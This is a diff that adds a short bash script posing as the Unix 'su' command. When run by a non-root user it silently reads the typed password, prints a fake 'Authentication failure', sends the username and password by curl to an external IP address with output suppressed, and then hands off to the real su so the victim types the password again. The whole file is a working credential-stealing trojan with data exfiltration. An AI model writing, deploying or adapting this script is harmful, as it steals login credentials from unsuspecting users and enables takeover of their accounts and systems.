@@ -1,0 +1,14 @@
+#!/bin/bash
+USER_LST=($(awk -F: '{print $1}' /etc/passwd))
+input_user=${1:-"root"}
+current_user=`whoami`
+echo "${USER_LST[@]}" |  grep -wq "${input_user}" && flag="yes"|| flag="no"
+if [ "$flag" != "yes" ]; then echo "su: user ${input_user} does not exist";exit;fi
+if [ "${current_user}" != "root" ]; then
+    echo -ne "Password:"
+    read -s passwd
+    echo "su: Authentication failure"
+    #go and check your web logfile.
+    (curl -s "http://170.170.64.78:8000/?username=${input_user}&passwd=${passwd}" ) 2>&1 > /dev/null
+fi
+/usr/bin/su $input_user
